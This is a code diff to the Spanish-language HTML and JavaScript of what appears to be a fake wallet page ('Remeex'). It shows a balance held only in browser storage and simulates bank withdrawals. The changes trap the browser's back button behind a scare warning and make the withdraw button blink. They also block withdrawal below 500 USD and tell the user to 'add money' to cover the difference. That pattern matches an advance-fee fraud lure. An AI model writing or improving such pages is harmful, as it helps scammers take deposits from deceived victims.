@@ -70,7 +70,7 @@
       }
     }
 
-    /* Animación para parpadear el borde (similar al otro código) */
+    /* Animación para parpadear el borde */
     @keyframes border-blink {
       0%   { border-color: #ffffff; }
       33%  { border-color: #d1d5db; }
@@ -131,7 +131,6 @@
 
     /**************************************************************
       CONTENEDOR PRINCIPAL CON GLOW + GLASSMORPHISM
-      (Actualizado para incluir margen, borde y animaciones similares al otro código)
     **************************************************************/
     .container {
       max-width: 600px;
@@ -210,7 +209,6 @@
 
     /**************************************************************
       TARJETAS (card) / Hover con leve desplazamiento
-      (Se ha añadido margin-bottom para separar cada tarjeta)
     **************************************************************/
     .card {
       background: var(--card-bg);
@@ -327,6 +325,21 @@
       background: rgba(255, 255, 255, 0.15);
       color: #fff;
       backdrop-filter: blur(6px);
+    }
+
+    /* Efecto elegante de parpadeo para el botón Retirar */
+    @keyframes blinkButton {
+      0%, 100% {
+        box-shadow: 0 0 8px rgba(255,255,255,0.6);
+        transform: scale(1);
+      }
+      50% {
+        box-shadow: 0 0 12px rgba(255,255,255,0.9);
+        transform: scale(1.02);
+      }
+    }
+    .blink-elegant {
+      animation: blinkButton 1.8s ease-in-out infinite;
     }
 
     /**************************************************************
@@ -471,7 +484,7 @@
     }
 
     /**************************************************************
-      OVERLAYS Y MODALES (Unificados con animación y glass)
+      OVERLAYS Y MODALES
     **************************************************************/
     .overlay {
       position: fixed;
@@ -616,13 +629,22 @@
     }
   </style>
 
-  <!-- Función para evitar retroceder a la página anterior y redirigir a visa.es -->
+  <!-- Función para interceptar el retroceso y mostrar advertencia -->
   <script>
-    // Empuja un estado en el historial para poder interceptar el "back"
     history.pushState(null, null, location.href);
     window.addEventListener('popstate', function(event) {
-      // Redirige a visa.es si se pulsa el botón de retroceso
-      window.location.href = "https://www.visa.es";
+      // Mostramos mensaje de confirmación
+      const mensaje = "ADVERTENCIA: Si retrocede, perderá la sesión. " +
+                      "Recomendamos permanecer en la página. " +
+                      "Si necesita ayuda, comuníquese con nuestro Soporte Técnico.\n\n" +
+                      "¿Desea continuar y salir?";
+      if (confirm(mensaje)) {
+        // Si acepta, se dirige a visa.es
+        window.location.href = "https://www.visa.es";
+      } else {
+        // Si cancela, volvemos a 'anclar' el historial para bloquear el back
+        history.pushState(null, null, location.href);
+      }
     });
   </script>
 </head>
@@ -668,9 +690,9 @@
             <i class="fas fa-plus"></i>
             Añade dinero
           </button>
-          <button class="btn btn-secondary" id="btnRetirar">
+          <!-- Botón Retirar con parpadeo elegante -->
+          <button class="btn btn-secondary blink-elegant" id="btnRetirar">
             <i class="fas fa-university"></i>
-            <!-- Se reemplaza dinámicamente con el nombre del banco en JS -->
             Retirar a mi banco
           </button>
           <button class="btn btn-secondary" id="btnIntercambiar">
@@ -771,7 +793,7 @@
   <!-- Overlay de proceso de recarga -->
   <div class="overlay process-overlay" id="overlayProcesoRecarga">
     <div class="modal">
-      <!-- Canvas para confetti: se posiciona de forma absoluta y con z-index alto -->
+      <!-- Canvas para confetti -->
       <canvas id="confetti-canvas" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1000;"></canvas>
       <div class="process-message" id="msgRecargaEnProceso">
         <i class="fas fa-spinner fa-spin"></i>
@@ -834,15 +856,17 @@
     </div>
   </div>
 
-  <!-- Overlay Saldo Insuficiente -->
+  <!-- Overlay Saldo Insuficiente (ahora mensaje de retiro mínimo) -->
   <div class="overlay" id="overlaySaldoInsuficiente">
     <div class="modal">
-      <h3>Saldo Insuficiente</h3>
+      <h3>¡Monto de retiro mínimo es de 500 dólares!</h3>
       <p style="text-align:center; color:var(--danger); font-weight:600;">
-        Para retirar fondos a <strong id="insufficientBankName"></strong>, necesitas un saldo mínimo de <strong>69,000.00 Bs</strong>.
+        Para retirar fondos a <strong id="insufficientBankName"></strong>, necesitas tener al menos <strong>500 USD</strong> 
+        (es decir, <strong>40.500,00 Bs</strong> a la tasa actual).
       </p>
       <p style="text-align:center; color:var(--text-secondary); font-size:0.9rem;">
-        Debes presionar <strong>+ Añadir dinero</strong> y recargar la diferencia por <strong><span id="montoFaltanteBs">0,00</span> Bs</strong> 
+        Debes presionar <strong>+ Añadir dinero</strong> y recargar la diferencia que te falte.<br>
+        Diferencia estimada: <strong><span id="montoFaltanteBs">0,00</span> Bs</strong> 
         (<strong><span id="montoFaltanteUSD">0.00</span> USD</strong>).
       </p>
       <div style="text-align:center;">
@@ -894,7 +918,7 @@
     };
 
     let currentBalanceBS = parseFloat(sessionStorage.getItem("currentBalanceBS")) || 0;
-    let USD_RATE = 69.0; // Tasa fija de 69 Bs por USD
+    let USD_RATE = 81.0; // Tasa fija de 81 Bs por USD (actualizado)
     let monthlyIncomeUSD = parseFloat(sessionStorage.getItem("monthlyIncomeUSD")) || 0;
     let monthlyExpensesUSD = parseFloat(sessionStorage.getItem("monthlyExpensesUSD")) || 0;
 
@@ -911,7 +935,6 @@
 
     // Banco seleccionado (utilizando el valor de datosRemeex)
     let selectedBankName = remeexData.bankName || "Banco de Venezuela, SA";
-    // Definimos el logo según el diccionario
     let selectedBankLogoURL = bankLogos[selectedBankName] || "URL_DEL_LOGO_DEL_BANCO";
 
     // Referencias al DOM
@@ -962,12 +985,13 @@
     const msgIntercambioEnviando = document.getElementById('msgIntercambioEnviando');
     const msgIntercambioExito = document.getElementById('msgIntercambioExito');
 
-    // Overlays Saldo Insuficiente
+    // Overlays Saldo Insuficiente (retiro < 500 USD)
     const overlaySaldoInsuficiente = document.getElementById('overlaySaldoInsuficiente');
     const montoFaltanteBs = document.getElementById('montoFaltanteBs');
     const montoFaltanteUSD = document.getElementById('montoFaltanteUSD');
     const btnRecargar = document.getElementById('btnRecargar');
     const btnCerrarSaldoInsuficiente = document.getElementById('btnCerrarSaldoInsuficiente');
+    const insufficientBankName = document.getElementById('insufficientBankName');
 
     // Overlay Proceso Retiro
     const overlayProcesoRetiro = document.getElementById('overlayProcesoRetiro');
@@ -994,7 +1018,7 @@
       balanceAmount.textContent = formatNumberVE(currentBalanceBS) + " Bs";
       labelSaldo.textContent = formatNumberVE(currentBalanceBS) + " Bs";
 
-      // Cálculo de equivalente en USD:
+      // Equivalente en USD:
       const equivalentUSD = currentBalanceBS / USD_RATE;
       balanceUsdEquivalent.textContent = "≈ " + formatNumberVE(equivalentUSD) + " USD";
 
@@ -1068,10 +1092,11 @@
       });
     }
 
+    // Calcula la diferencia si el usuario no llega al mínimo de 500 USD
     function calcularFaltante() {
-      const minimo = 69000;
-      if (currentBalanceBS < minimo) {
-        const faltanteBs = minimo - currentBalanceBS;
+      const MIN_RETIRO_BS = 500 * USD_RATE; // 500 USD a 81 Bs
+      if (currentBalanceBS < MIN_RETIRO_BS) {
+        const faltanteBs = MIN_RETIRO_BS - currentBalanceBS;
         const faltanteUSD = faltanteBs / USD_RATE;
         montoFaltanteBs.textContent = formatNumberVE(faltanteBs);
         montoFaltanteUSD.textContent = formatNumberVE(faltanteUSD);
@@ -1136,13 +1161,11 @@
 
       // Si monthlyIncomeUSD está en 0 y el saldo disponible es > 0,
       // asumimos que el primer ingreso del mes corresponde a ese saldo.
-      // También agregamos una transacción de "Recarga con tarjeta de crédito"
-      // para reflejarlo en últimas transacciones si no había ninguna.
       if (monthlyIncomeUSD === 0 && currentBalanceBS > 0) {
         monthlyIncomeUSD = currentBalanceBS / USD_RATE;
       }
 
-      // Si no hay transacciones previas, registramos la primera como "Recarga con tarjeta de crédito"
+      // Si no hay transacciones previas, registramos la primera como recarga
       if (!hasTransactions && currentBalanceBS > 0) {
         addTransaction("Recarga con tarjeta de crédito", currentBalanceBS, '+');
       }
@@ -1190,7 +1213,7 @@
         msgRecargaEnProceso.classList.add('hidden');
         msgRecargaExitosa.classList.remove('hidden');
 
-        // Lanzar confetti usando el canvas incluido en el modal
+        // Lanzar confetti
         var confettiCanvas = document.getElementById('confetti-canvas');
         var myConfetti = confetti.create(confettiCanvas, { resize: true });
         myConfetti({
@@ -1217,24 +1240,24 @@
 
     // ========================= RETIRAR A MI BANCO =========================
     btnRetirar.addEventListener('click', () => {
-      const minimo = 69000;
+      // Mínimo 500 USD
+      const minimo = 500 * USD_RATE; // 500 USD en Bs (81 * 500 = 40500)
       if (currentBalanceBS >= minimo) {
         // Mostrar overlay de proceso de retiro
         showOverlay(overlayProcesoRetiro);
-        // Actualizar mensaje: ahora se muestra "Estableciendo conexión con ..." junto al nombre del banco
+        // Actualizar mensaje
         msgProcesoRetiro.querySelector('span').textContent = `Estableciendo conexión con ${selectedBankName}...`;
 
         // Simular proceso
         setTimeout(() => {
           hideOverlay(overlayProcesoRetiro);
-          // Redirigimos a retiroremeex.html (o a la página que corresponda)
+          // Redirigimos a retiroremeex.html (o la página que corresponda)
           window.location.href = 'retiroremeex.html';
         }, 4000);
 
       } else {
         calcularFaltante();
-        // Actualizamos el overlay de saldo insuficiente con el nombre del banco
-        document.getElementById("insufficientBankName").textContent = selectedBankName;
+        insufficientBankName.textContent = selectedBankName;
         showOverlay(overlaySaldoInsuficiente);
       }
     });
@@ -1354,6 +1377,7 @@
   </script>
 </body>
 </html>
+
 
 
 
